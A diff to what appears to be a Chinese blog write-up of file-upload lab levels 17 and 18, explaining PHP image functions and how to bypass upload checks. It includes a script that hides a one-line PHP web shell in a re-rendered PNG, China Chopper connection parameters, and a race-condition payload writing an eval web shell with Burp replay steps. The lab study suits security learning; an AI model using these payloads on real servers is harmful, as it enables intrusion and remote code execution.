@@ -720,7 +720,139 @@ SetHandler application<span class="token operator">/</span>x<span class="token o
 <p>#这关也是换了个函数进行验证，思路和13关一样。</p>
 <p>总结下 14，15，16 三关。差别是使用不同的方法对传进来的文件进行信息的验证。</p>
 <p>看博客说exif_magictype 比 getmagicsize 验证快的多。</p>
-<h3 id="0x17"><a href="#0x17" class="headerlink" title="#0x17"></a>#0x17</h3>
+<h3 id="0x17"><a href="#0x17" class="headerlink" title="#0x17"></a>#0x17</h3><p>函数知识补充：</p>
+<p>#basename(path,suffix)</p>
+<p>函数返回路径中的文件名部分。</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>path</td>
+<td>必需。规定要检查的路径。</td>
+</tr>
+<tr>
+<td>suffix</td>
+<td>可选。规定文件扩展名。如果文件有名有文件扩展名，将不会显示这个扩展名。</td>
+</tr>
+</tbody></table>
+<p>#imagecreatefrom__()</p>
+<p>该系列函数用于从文件或 URL 载入一幅图像，返回一图像标识符，代表了从给定的文件名取得的图像。失败返回 false。</p>
+<p>注：程序通过imagecreatefromjpeg()函数调用了PHP GD库（GD库，是php处理图形的扩展库），对图片进行了转换。</p>
+<p>该系列函数有：</p>
+<p>imagecreatefromgif()：      创建一块画布，并从 GIF 文件或 URL 地址载入一副图像<br>imagecreatefromjpeg()：   创建一块画布，并从 JPEG 文件或 URL 地址载入一副图像<br>imagecreatefrompng()：    创建一块画布，并从 PNG 文件或 URL 地址载入一副图像<br>imagecreatefromwbmp()：创建一块画布，并从 WBMP 文件或 URL 地址载入一副图像<br>imagecreatefromstring()： 创建一块画布，并从字符串中的图像流新建一副图像</p>
+<p>#unlink(filename,context)</p>
+<p>删除文件。</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>filename</td>
+<td>必需。规定要删除的文件。</td>
+</tr>
+<tr>
+<td>context</td>
+<td>可选。规定文件句柄的环境。context 是一套可以修改流的行为的选项。</td>
+</tr>
+</tbody></table>
+<p>如果成功，该函数返回 TRUE。如果失败，则返回 FALSE。</p>
+<p>#srand(seed)</p>
+<p>播下随机数发生器种子。</p>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>seed</td>
+<td>可选。用 seed 播下随机数发生器种子。</td>
+</tr>
+</tbody></table>
+<p>自 PHP 4.2.0 起，不再需要用 srand() 或 <a target="_blank" rel="noopener" href="https://www.w3school.com.cn/php/func_math_mt_srand.asp">mt_srand()</a> 函数给随机数发生器播种，现在已自动完成。所以这个函数现在来说应该没用。</p>
+<p>#strval( mixed $var)</p>
+<p>用于获取变量的字符串值。</p>
+<p>$var: 可以是任何标量类型，但不能是数组或对象。</p>
+<p>#image__()</p>
+<p>将图像输出到浏览器或文件。</p>
+<p>imagegif()：       以 GIF 格式将图像输出到浏览器或文件<br>imagejpeg()：    以 JPEG 格式将图像输出到浏览器或文件<br>imagepng()：     以 PNG 格式将图像输出到浏览器或文件<br>imagewbmp()：以 WBMP 格式将图像输出到浏览器或文件</p>
+<p>#因为重新渲染了图片所以我们写的一句话木马会消失。</p>
+<p>利用大佬写的php脚本制作一张图片马</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> 
+
+<span class="token variable">$p</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">0xa3</span><span class="token punctuation">,</span> <span class="token number">0x9f</span><span class="token punctuation">,</span> <span class="token number">0x67</span><span class="token punctuation">,</span> <span class="token number">0xf7</span><span class="token punctuation">,</span> <span class="token number">0x0e</span><span class="token punctuation">,</span> <span class="token number">0x93</span><span class="token punctuation">,</span> <span class="token number">0x1b</span><span class="token punctuation">,</span> <span class="token number">0x23</span><span class="token punctuation">,</span> 
+
+​          <span class="token number">0xbe</span><span class="token punctuation">,</span> <span class="token number">0x2c</span><span class="token punctuation">,</span> <span class="token number">0x8a</span><span class="token punctuation">,</span> <span class="token number">0xd0</span><span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token number">0xf9</span><span class="token punctuation">,</span> <span class="token number">0xe1</span><span class="token punctuation">,</span> <span class="token number">0xae</span><span class="token punctuation">,</span> 
+
+​          <span class="token number">0x22</span><span class="token punctuation">,</span> <span class="token number">0xf6</span><span class="token punctuation">,</span> <span class="token number">0xd9</span><span class="token punctuation">,</span> <span class="token number">0x43</span><span class="token punctuation">,</span> <span class="token number">0x5d</span><span class="token punctuation">,</span> <span class="token number">0xfb</span><span class="token punctuation">,</span> <span class="token number">0xae</span><span class="token punctuation">,</span> <span class="token number">0xcc</span><span class="token punctuation">,</span> 
+
+​          <span class="token number">0x5a</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0xdc</span><span class="token punctuation">,</span> <span class="token number">0x5a</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0xdc</span><span class="token punctuation">,</span> <span class="token number">0xa3</span><span class="token punctuation">,</span> <span class="token number">0x9f</span><span class="token punctuation">,</span> 
+
+​          <span class="token number">0x67</span><span class="token punctuation">,</span> <span class="token number">0xa5</span><span class="token punctuation">,</span> <span class="token number">0xbe</span><span class="token punctuation">,</span> <span class="token number">0x5f</span><span class="token punctuation">,</span> <span class="token number">0x76</span><span class="token punctuation">,</span> <span class="token number">0x74</span><span class="token punctuation">,</span> <span class="token number">0x5a</span><span class="token punctuation">,</span> <span class="token number">0x4c</span><span class="token punctuation">,</span> 
+
+​          <span class="token number">0xa1</span><span class="token punctuation">,</span> <span class="token number">0x3f</span><span class="token punctuation">,</span> <span class="token number">0x7a</span><span class="token punctuation">,</span> <span class="token number">0xbf</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0x6b</span><span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token number">0x2d</span><span class="token punctuation">,</span> 
+
+​          <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token number">0x65</span><span class="token punctuation">,</span> <span class="token number">0x7d</span><span class="token punctuation">,</span> <span class="token number">0x52</span><span class="token punctuation">,</span> <span class="token number">0x9d</span><span class="token punctuation">,</span> <span class="token number">0xad</span><span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token number">0xa1</span><span class="token punctuation">,</span> 
+
+​          <span class="token number">0x66</span><span class="token punctuation">,</span> <span class="token number">0x44</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+
+<span class="token variable">$img</span> <span class="token operator">=</span> <span class="token function">imagecreatetruecolor</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+
+<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$y</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$y</span> <span class="token operator">&lt;</span> <span class="token function">sizeof</span><span class="token punctuation">(</span><span class="token variable">$p</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$y</span> <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">)</span> 
+
+<span class="token operator">&amp;</span><span class="token shell-comment comment">#123; </span>
+
+  <span class="token variable">$r</span> <span class="token operator">=</span> <span class="token variable">$p</span><span class="token punctuation">[</span><span class="token variable">$y</span><span class="token punctuation">]</span><span class="token punctuation">;</span> 
+
+  <span class="token variable">$g</span> <span class="token operator">=</span> <span class="token variable">$p</span><span class="token punctuation">[</span><span class="token variable">$y</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span> 
+
+  <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$p</span><span class="token punctuation">[</span><span class="token variable">$y</span><span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span> 
+
+  <span class="token variable">$color</span> <span class="token operator">=</span> <span class="token function">imagecolorallocate</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">,</span> <span class="token variable">$r</span><span class="token punctuation">,</span> <span class="token variable">$g</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+
+  <span class="token function">imagesetpixel</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">,</span> <span class="token function">round</span><span class="token punctuation">(</span><span class="token variable">$y</span> <span class="token operator">/</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$color</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+
+<span class="token operator">&amp;</span><span class="token shell-comment comment">#125; </span>
+
+  <span class="token function">imagepng</span><span class="token punctuation">(</span><span class="token variable">$img</span><span class="token punctuation">,</span><span class="token string">'./fox.png'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+
+  <span class="token delimiter">?></span></code></pre>
+<p>再准备一张普通的png图片。在该目录下输入命令 php pass17.php pass17.png</p>
+<p>前面是脚本的名字，后面是png图片保存的名字。然后就会生存fox.png</p>
+<p>上传，在目录下打开发现一句话木马没有被改变。这个一句话木马需要同时传参GET参数0和POST参数1才行</p>
+<p>用菜刀连接file=./upload/1234.png&amp;0=assert  密码是1 就可以了</p>
+<p>注：</p>
+<p>#这里不能用eval函数 </p>
+<p>#只有php.ini中开启short_open_tag 才可以用&lt;?  代替 &lt;?php  , 用&lt;?= 代替 &lt;? echo</p>
+<p>#在PHP7.1版本以后，assert()默认不再可以执行代码 就像eval一样。所以说 assert也和eval一样不能被可变函数调用。</p>
+<h3 id="0x18"><a href="#0x18" class="headerlink" title="#0x18"></a>#0x18</h3><p>代码审计</p>
+<pre class=" language-php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$upload_file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span><span class="token variable">$ext_arr</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token shell-comment comment">#123;</span>
+             <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token punctuation">.</span> <span class="token string">'/'</span><span class="token punctuation">.</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string">"YmdHis"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"."</span><span class="token punctuation">.</span><span class="token variable">$file_ext</span><span class="token punctuation">;</span>
+             <span class="token function">rename</span><span class="token punctuation">(</span><span class="token variable">$upload_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+             <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
+        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;else&amp;#123;</span>
+            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">"只允许上传.jpg|.png|.gif类型文件！"</span><span class="token punctuation">;</span>
+            <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$upload_file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span>
+    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;else&amp;#123;</span>
+        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">'上传出错！'</span><span class="token punctuation">;</span>
+    <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;</span></code></pre>
+<p>这里是先把文件存进服务器里，再进行文件类型的判断，正确改名上传。错误则删除。</p>
+<p>所以可以利用它判断的时间差，来上传木马文件。</p>
+<pre><code>&lt;?php 
+fputs(fopen(&#39;fox.php&#39;,&#39;w+&#39;),&#39;&lt;?php eval($_POST[fox]);?&gt;&#39;);
+?&gt;</code></pre>
+<p>用burp截住包,我们需要的不断重放这个数据包，所以选择没有负载。线程设高一点，然后开始攻击。不断刷新页面即可，就会在目录下生存fox.php的木马文件。</p>
+
             </div>
             <hr/>
 
@@ -1215,7 +1347,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
         <div class="col s12 m8 l8 copy-right">
             Copyright&nbsp;&copy;
             
-                <span id="year">2019-2020</span>
+                <span id="year">2019-2021</span>
             
             <span id="year">2019</span>
             <a href="/about" target="_blank">Chan.Joy</a>
